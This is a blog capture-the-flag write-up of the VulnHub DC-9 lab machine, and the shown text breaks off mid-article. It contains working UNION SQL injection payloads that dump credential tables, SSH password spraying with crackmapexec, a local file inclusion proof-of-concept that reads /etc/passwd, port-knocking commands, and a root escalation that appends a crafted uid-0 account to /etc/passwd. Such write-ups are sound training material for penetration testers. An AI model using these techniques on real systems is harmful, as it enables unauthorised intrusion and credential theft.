<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>VulnHub - DC-9 | Ef's log</title><meta name=keywords content="VulnHub,Writeup,Cyber Security,Pentesting"><meta name=description content="DC-9 from VulnHub features a website that is vulnerable to SQL injection.
I’m able to dump a bunch of users’ credentials by exploiting SQLi and gain a foothold on the system after spraying them on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write with root access.
Actually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full nmap scan broke that rule."><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/vulnhub/dc9/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="VulnHub - DC-9"><meta property="og:description" content="DC-9 from VulnHub features a website that is vulnerable to SQL injection.
I’m able to dump a bunch of users’ credentials by exploiting SQLi and gain a foothold on the system after spraying them on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write with root access.
Actually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full nmap scan broke that rule."><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/vulnhub/dc9/"><meta property="article:section" content="vulnhub"><meta property="article:published_time" content="2021-06-02T01:18:59+07:00"><meta property="article:modified_time" content="2021-06-02T01:18:59+07:00"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/ophiuchi/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/traverxec/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/heist/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/active/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/shocker/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/atom/"><meta name=twitter:card content="summary"><meta name=twitter:title content="VulnHub - DC-9"><meta name=twitter:description content="DC-9 from VulnHub features a website that is vulnerable to SQL injection.
I’m able to dump a bunch of users’ credentials by exploiting SQLi and gain a foothold on the system after spraying them on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write with root access.
Actually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full nmap scan broke that rule."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"VulnHub","item":"https://fahmifj.github.io/vulnhub/"},{"@type":"ListItem","position":2,"name":"VulnHub - DC-9","item":"https://fahmifj.github.io/vulnhub/dc9/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"VulnHub - DC-9","name":"VulnHub - DC-9","description":"DC-9 from VulnHub features a website that is vulnerable to SQL injection.\nI’m able to dump a bunch of users’ credentials by exploiting SQLi and gain a foothold on the system after spraying them on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write with root access.\nActually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full nmap scan broke that rule.","keywords":["VulnHub","Writeup","Cyber Security","Pentesting"],"articleBody":"DC-9 from VulnHub features a website that is vulnerable to SQL injection.\nI’m able to dump a bunch of users’ credentials by exploiting SQLi and gain a foothold on the system after spraying them on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write with root access.\nActually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full nmap scan broke that rule. Even though I gained a foothold by skipping the LFI and port knocking, I’ll still include the intended way (LFI and port knocking) in the foothold section.\nSkills Learned Blind SQL injection Local file Inclusion Port knocking Tools Nmap Arpscan CrackMapExec Reconnaissance Host Discovery - arp-scan 192.168.2.102 is the target.\n→ root@iamf «dc-9» «192.168.2.103» $ arp-scan --interface eth0 192.168.2.0/24 | tee scans/00-arp-scan Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103 Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.2.2 0a:00:27:00:00:0a (Unknown: locally administered) 192.168.2.1 08:00:27:d9:63:87 PCS Systemtechnik GmbH 192.168.2.102 08:00:27:54:bc:fd PCS Systemtechnik GmbH 3 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.9.7: 256 hosts scanned in 1.986 seconds (128.90 hosts/sec). 3 responded Port Scan - nmap nmap shows two ports available, 80 (HTTP) and 22 (SSH). SSH port is in filtered state.\n→ root@iamf «dc-9» «192.168.2.103» $ nmap -n -sC -sV -oA scans/10-initial-dc9 '192.168.2.102' -v # Nmap 7.80 scan initiated Thu Apr 8 02:43:51 2021 as: nmap -n -sC -sV -oA scans/10-initial-dc9 -v 192.168.2.102 Nmap scan report for 192.168.2.102 Host is up (0.00048s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp filtered ssh 80/tcp open http Apache httpd 2.4.38 ((Debian)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Example.com - Staff Details - Welcome MAC Address: 08:00:27:54:BC:FD (Oracle VirtualBox virtual NIC) But, later it turns into open state after a full port scan performed.\n→ root@iamf «dc-9» «192.168.2.103» $ nmap -n -p22 192.168.2.102 Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-08 05:21 EDT Nmap scan report for 192.168.2.102 Host is up (0.00075s latency). PORT STATE SERVICE 22/tcp open ssh MAC Address: 08:00:27:54:BC:FD (Oracle VirtualBox virtual NIC) I can confirms it with netcat.\n→ root@iamf «dc-9» «192.168.2.103» $ nc 192.168.2.102 22 SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1 Enumeration TCP 80 - Website The home page of this site doesn’t provide anything useful.\nThe Display All Records menu functions to display all user records.\nThere is a user input on the Search menu\nThe Manage menu has login function.\nFrom here I can assume that the website uses database.\nFoothold SQL injection Identify There’s error-based SQL injection on search.php, and the initial detection is simple, when I try put ' it gives bug (joke reference).\nIn this web, the SQLi vulnerability can be identified by adding a single quote (’`) at the end of users’ first name that I want to search.\nBased on the search page, you can only input one name (either the first or the last name) and it will return a single record, so without ', the search should return one related result.\nBut then, when I submit ' OR 1=1 -- -', it returns all the records.\nUNION injection To perform the SQL union injection attack manually, I’ll have to identify the available columns and its data type.\nThere are 6 columns with the data type of each column is string. The injection query is as follows:\n' UNION SELECT 'a','b','c','d','e','f' -- I’ll pull out database version, current database, and the available databases.\n' UNION SELECT @@version, 'Current DB:', database(), group_concat(SCHEMA_NAME),5,6 FROM information_schema.schemata -- - The website uses MariaDB as its database. The database currently in use is Staff. Staff and users are non-default database, so I’ll look into these tables.\nWith the following query, I can get the two tables name from database Staff: StaffDetails and Users.\n'UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables where table_schema = 'Staff' -- - StaffDetails contains the all the staff records which previously seen at the Display All Records menu.\nI’ll get the columns name of the table Users with the following query:\n'UNION SELECT group_concat(column_name), 2,3,4,5,6 from information_schema.columns where table_name = 'Users' -- - I will get the contents of the Username and the Password columns, and it returns a set of credentials.\n' UNION SELECT group_concat(username, ':', password),2,3,4,5,6 FROM Users -- - The password is in md5 format.\n→ root@iamf «dc-9» «192.168.2.103» $ echo 856f5de590ef37314e7c3bdf6f8a66dc | wc -c 33 The hash can be cracked online. The credentials is admin:transorbital1, and I’ll just keep that for now.\nOn database users, there is only one table called UserDetails. Here is the query.\n'UNION SELECT group_concat(table_name),2,3,4,5,6 FROM information_schema.tables where table_schema = 'users' -- - With the following query, I can get the columns on table UserDetails.\n' UNION SELECT group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name = 'UserDetails' -- - UserDetails has 6 columns, but I’m interested only with the username and the password column, and I’ll pull out the their contents.\n' UNION SELECT group_concat(username,\":\",password),2,3,4,5,6 FROM users.UserDetails -- - That’s a lot of credentials. I can sort these creds with sed command by substituting comma with new line.\n→ root@iamf «dc-9» «192.168.2.103» $ echo -n 'marym:3kfs86sfd,julied:468sfdfsd2,fredf:4sfd87sfd1,barneyr:RocksOff,tomc:TC\u0026TheBoyz,jerrym:B8m#48sd,wilmaf:Pebbles,bettyr:BamBam01,chandlerb:UrAG0D!,joeyt:Passw0rd,rachelg:yN72#dsd,rossg:ILoveRachel,monicag:3248dsds7s,phoebeb:smellycats,scoots:YR3BVxxxw87,janitor:Ilovepeepee,janitor2:Hawaii-Five-0' | sed -s 's/,/\\n/g' marym:3kfs86sfd julied:468sfdfsd2 fredf:4sfd87sfd1 barneyr:RocksOff tomc:TC\u0026TheBoyz jerrym:B8m#48sd wilmaf:Pebbles bettyr:BamBam01 chandlerb:UrAG0D! joeyt:Passw0rd rachelg:yN72#dsd rossg:ILoveRachel monicag:3248dsds7s phoebeb:smellycats scoots:YR3BVxxxw87 janitor:Ilovepeepee janitor2:Hawaii-Five-0 Shell access SSH Login brute-force Since the SSH port is open, I tried all the credentials I obtained from SQLi on SSH using crackmapexec. It returned 3 valid logins.\n→ root@iamf «dc-9» «192.168.2.103» $ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success SSH 192.168.2.102 22 192.168.2.102 [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1 ...... SSH 192.168.2.102 22 192.168.2.102 [+] chandlerb:UrAG0D! SSH 192.168.2.102 22 192.168.2.102 [+] joeyt:Passw0rd ...... SSH 192.168.2.102 22 192.168.2.102 [+] janitor:Ilovepeepee ...... (Intended) LFI and Port Knocking In my case, I discovered that the website is vulnerable to LFI after inspecting the source code.\nchandlerb@dc-9:/var/www/html$ cat manage.php \u003c?php $file = 'contact-info.php'; $show_errors = $_SESSION['display_errors']; if ($show_errors == 'yes') { if(file_exists($file)) { include($file); } else { echo \"File does not exist\" . \"\n\"; # LFI vulnerability starts from here $file = $_GET['file']; # No input sanitization poc: manage?file=../../../../etc/passwd include('directory/' . $file); } ...... Using LFI is the intended way to gain a foothold before performing brute force. In order to exploit it, I previously had to login using the credentials I obtained through SQLi (admin:transorbital1).\nWith LFI can include /etc/knockd.conf to read the knocking sequence to open the SSH port.\nIn case the SSH port is closed, then to open it, I’ll need to interact with port 7469,8475,9842 sequentially.\nfor i in 7469 8475 9842; do nc -w1 192.168.2.102 $i; done; To close the port, I’ll need to knock in reverse order:\nfor i in 9842 8475 7469; do nc -w1 192.168.2.102 $i; done; Then, from here, I should use SSH brute force (which I did earlier).\nPrivilege Escalation Shell as fredf Enumeration Only user janitor that has one valuable thing in its home dir, and that is a password list.\njanitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt BamBam01 Passw0rd smellycats P0Lic#10-4 B4-Tru3-001 4uGU5T-NiGHts With those new password, I’ll perform another brute force using crackmapexec.\nSSH - fredf crackmapexec returns one valid login for fred:B4-Tru3-001.\n→ root@iamf «dc-9» «192.168.2.103» $ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success SSH 192.168.2.102 22 192.168.2.102 [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1 ... SSH 192.168.2.102 22 192.168.2.102 [+] fredf:B4-Tru3-001 ... → root@iamf «dc-9» «192.168.2.103» $ ssh fredf@192.168.2.102 fredf@192.168.2.102's password: Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Thu Apr 8 20:10:42 2021 from 192.168.2.103 fredf@dc-9:~$ id uid=1003(fredf) gid=1003(fredf) groups=1003(fredf) Shell as root Enumeration User fredf has sudo privileges on a custom binary called test\nfredf@dc-9:/home$ sudo -l Matching Defaults entries for fredf on dc-9: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User fredf may run the following commands on dc-9: (root) NOPASSWD: /opt/devstuff/dist/test/test I suspect /opt/devstuff/test.py is the actual code of that binary.\nfredf@dc-9:/opt/devstuff$ cat test.py #!/usr/bin/python import sys if len (sys.argv) != 3 : print (\"Usage: python test.py read append\") sys.exit (1) else : f = open(sys.argv[1], \"r\") output = (f.read()) f = open(sys.argv[2], \"a\") f.write(output) f.close() Script Analysis It checks if the arguments are equal to 3. If it doesn’t have 3 arguments, it exits.\nif len (sys.argv) != 3 : print (\"Usage: python test.py read append\") sys.exit (1) Otherwise, it reads a file specified on argv1 in read mode and store its contents to the variable output.\nelse : f = open(sys.argv[1], \"r\") output = (f.read()) Then it opens a file specified on argv2 in append mode and it adds the variable output (the file contents of argv1) to that file.\nf = open(sys.argv[2], \"a\") f.write(output) f.close() Since this gives arbitrary write on the system, it can be exploited in many ways, one of which is to add a new root account to /etc/passwd.\nExploitation First, I’ll create a password hash using openssl command.\nfredf@dc-9:/tmp$ openssl passwd -1 -salt iamf pass123 $1$iamf$lq0NuDAhNy8IFlaFgiRw20 I’ll follow the flat database format of /etc/passwd to create my own user. I’ll use the field property of root user, and substitute the password (x field) and the username with the one I specified.\n# From this root:x:0:0:root:/root:/bin/bash # To iamf:$1$iamf$lq0NuDAhNy8IFlaFgiRw20:0:0:root:/root:/bin/bash I’ll store that to a file called /tmp/passwd.\nAnd now I can just append the content of /tmp/passwd to /etc/passwd using /opt/devstuff/dist/test/test.\nfredf@dc-9:/tmp$ sudo /opt/devstuff/dist/test/test /tmp/passwd /etc/passwd I can confirms my account is there (/etc/passwd).\nfredf@dc-9:/tmp$ cat /etc/passwd ... janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash iamf:$1$iamf$lq0NuDAhNy8IFlaFgiRw20:0:0:root:/root:/bin/bash SU - root Now I can switch to my account and get a root shell.\nfredf@dc-9:/tmp$ su iamf Password: pass123 root@dc-9:/tmp# And here is the flag,\nroot@dc-9:~# cat theflag.txt ███╗ ██╗██╗ ██████╗███████╗ ██╗ ██╗ ██████╗ ██████╗ ██╗ ██╗██╗██╗██╗ ████╗ ██║██║██╔════╝██╔════╝ ██║ ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║ ██╔██╗ ██║██║██║ █████╗ ██║ █╗ ██║██║ ██║██████╔╝█████╔╝ ██║██║██║ ██║╚██╗██║██║██║ ██╔══╝ ██║███╗██║██║ ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝ ██║ ╚████║██║╚██████╗███████╗ ╚███╔███╔╝╚██████╔╝██║ ██║██║ ██╗██╗██╗██╗ ╚═╝ ╚═══╝╚═╝ ╚═════╝╚══════╝ ╚══╝╚══╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝╚═╝╚═╝ Congratulations - you have done well to get to this point. Hope you enjoyed DC-9. Just wanted to send out a big thanks to all those who have taken the time to complete the various DC challenges. I also want to send out a big thank you to the various members of @m0tl3ycr3w . They are an inspirational bunch of fellows. Sure, they might smell a bit, but...just kidding. :-) Sadly, all things must come to an end, and this will be the last ever challenge in the DC series. So long, and thanks for all the fish. ","wordCount":"1775","inLanguage":"en","datePublished":"2021-06-02T01:18:59+07:00","dateModified":"2021-06-02T01:18:59+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/vulnhub/dc9/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/vulnhub/>VulnHub</a></div><h1 class=post-title>VulnHub - DC-9</h1><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>June 02, 2021</span>&nbsp;&#183;&nbsp;<span class=meta-read>9 min read</span></div><hr><div class=series-info>Series:&nbsp;<a href=https://fahmifj.github.io/series/oscp-like/>OSCP like</a></div></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#host-discovery---arp-scan aria-label="Host Discovery - arp-scan">Host Discovery - arp-scan</a></li><li><a href=#port-scan---nmap aria-label="Port Scan - nmap">Port Scan - nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---website aria-label="TCP 80 - Website">TCP 80 - Website</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#sql-injection aria-label="SQL injection">SQL injection</a></li><li><a href=#shell-access aria-label="Shell access">Shell access</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-fredf aria-label="Shell as fredf">Shell as fredf</a></li><li><a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul></li></ul></div></aside><div class=post-content><p>DC-9 from VulnHub features a website that is vulnerable to SQL injection.</p><p>I’m able to dump a bunch of users’ credentials by exploiting SQLi and gain a foothold on the system after spraying them on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write with root access.</p><p>Actually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full <code>nmap</code> scan broke that rule. Even though I gained a foothold by skipping the LFI and port knocking, I&rsquo;ll still include the intended way (LFI and port knocking) in the foothold section.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>Blind SQL injection</li><li>Local file Inclusion</li><li>Port knocking</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Nmap</li><li>Arpscan</li><li>CrackMapExec</li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=host-discovery---arp-scan>Host Discovery - arp-scan<a class=anchor aria-hidden=true href=#host-discovery---arp-scan>#</a></h3><p><code>192.168.2.102</code> is the target.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class=line><span class=cl>$ arp-scan --interface eth0 192.168.2.0/24 <span class=p>|</span> tee scans/00-arp-scan
</span></span><span class=line><span class=cl>Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103
</span></span><span class=line><span class=cl>Starting arp-scan 1.9.7 with <span class=m>256</span> hosts <span class=o>(</span>https://github.com/royhills/arp-scan<span class=o>)</span>
</span></span><span class=line><span class=cl>192.168.2.2     0a:00:27:00:00:0a       <span class=o>(</span>Unknown: locally administered<span class=o>)</span>
</span></span><span class=line><span class=cl>192.168.2.1     08:00:27:d9:63:87       PCS Systemtechnik GmbH
</span></span><span class=line><span class=cl>192.168.2.102   08:00:27:54:bc:fd       PCS Systemtechnik GmbH
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>3</span> packets received by filter, <span class=m>0</span> packets dropped by kernel
</span></span><span class=line><span class=cl>Ending arp-scan 1.9.7: <span class=m>256</span> hosts scanned in 1.986 seconds <span class=o>(</span>128.90 hosts/sec<span class=o>)</span>. <span class=m>3</span> responded
</span></span></code></pre></div><h3 id=port-scan---nmap>Port Scan - nmap<a class=anchor aria-hidden=true href=#port-scan---nmap>#</a></h3><p><code>nmap</code> shows two ports available, 80 (HTTP) and 22 (SSH). SSH port is in filtered state.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class=line><span class=cl>$ nmap -n -sC -sV -oA scans/10-initial-dc9 <span class=s1>&#39;192.168.2.102&#39;</span> -v
</span></span><span class=line><span class=cl><span class=c1># Nmap 7.80 scan initiated Thu Apr  8 02:43:51 2021 as: nmap -n -sC -sV -oA scans/10-initial-dc9 -v 192.168.2.102</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.2.102
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00048s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed ports
</span></span><span class=line><span class=cl>PORT   STATE    SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp filtered ssh
</span></span><span class=line><span class=cl>80/tcp open     http    Apache httpd 2.4.38 <span class=o>((</span>Debian<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.38 <span class=o>(</span>Debian<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Example.com - Staff Details - Welcome
</span></span><span class=line><span class=cl>MAC Address: 08:00:27:54:BC:FD <span class=o>(</span>Oracle VirtualBox virtual NIC<span class=o>)</span>
</span></span></code></pre></div><p>But, later it turns into open state after a full port scan performed.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class=line><span class=cl>$ nmap -n -p22 192.168.2.102
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-04-08 05:21 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.2.102
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00075s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE
</span></span><span class=line><span class=cl>22/tcp open  ssh
</span></span><span class=line><span class=cl>MAC Address: 08:00:27:54:BC:FD <span class=o>(</span>Oracle VirtualBox virtual NIC<span class=o>)</span>
</span></span></code></pre></div><p>I can confirms it with <code>netcat</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class=line><span class=cl>$ nc 192.168.2.102 <span class=m>22</span>
</span></span><span class=line><span class=cl>SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
</span></span></code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---website>TCP 80 - Website<a class=anchor aria-hidden=true href=#tcp-80---website>#</a></h3><p>The home page of this site doesn&rsquo;t provide anything useful.</p><p><div class=img-container><img src=imgs/image-20210408134805695.png alt=image-20210408134805695></div></p><p>The Display All Records menu functions to display all user records.</p><p><div class=img-container><img src=imgs/image-20210408134819215.png alt=image-20210408134819215></div></p><p>There is a user input on the Search menu</p><p><div class=img-container><img src=imgs/image-20210408134833069.png alt=image-20210408134833069></div></p><p>The Manage menu has login function.</p><p><div class=img-container><img src=imgs/image-20210408134853665.png alt=image-20210408134853665></div></p><p>From here I can assume that the website uses database.</p><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=sql-injection>SQL injection<a class=anchor aria-hidden=true href=#sql-injection>#</a></h3><h4 id=identify>Identify<a class=anchor aria-hidden=true href=#identify>#</a></h4><p>There&rsquo;s error-based SQL injection on <code>search.php</code>, and the initial detection is simple, <em>when I try put <code>'</code> it gives bug</em> (joke <a href=https://twitter.com/LiveOverflow/status/1313157161007054854>reference</a>).</p><p>In this web, the SQLi vulnerability can be identified by adding a single quote (&rsquo;`) at the end of users&rsquo; first name that I want to search.</p><p><div class=img-container><img src=imgs/image-20210602031408130.png alt=image-20210602031408130></div></p><p>Based on the search page, you can only input one name (either the first or the last name) and it will return a single record, so without <code>'</code>, the search should return one related result.</p><p><div class=img-container><img src=imgs/image-20210602031344011.png alt=image-20210602031344011></div></p><p>But then, when I submit <code>' OR 1=1 -- -'</code>, it returns all the records.</p><p><div class=img-container><img src=imgs/image-20210602030509083.png alt=image-20210602030509083></div></p><h4 id=union-injection>UNION injection<a class=anchor aria-hidden=true href=#union-injection>#</a></h4><p>To perform the SQL union injection attack manually, I&rsquo;ll have to identify the available columns and its data type.</p><p>There are 6 columns with the data type of each column is string. The injection query is as follows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39; UNION SELECT &#39;</span><span class=n>a</span><span class=s1>&#39;,&#39;</span><span class=n>b</span><span class=s1>&#39;,&#39;</span><span class=k>c</span><span class=s1>&#39;,&#39;</span><span class=n>d</span><span class=s1>&#39;,&#39;</span><span class=n>e</span><span class=s1>&#39;,&#39;</span><span class=n>f</span><span class=s1>&#39; -- 
</span></span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210602033329668.png alt=image-20210602033329668></div></p><p>I’ll pull out database version, current database, and the available databases.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39; UNION SELECT @@version, &#39;</span><span class=k>Current</span><span class=w> </span><span class=n>DB</span><span class=p>:</span><span class=s1>&#39;, database(), group_concat(SCHEMA_NAME),5,6 FROM information_schema.schemata -- -
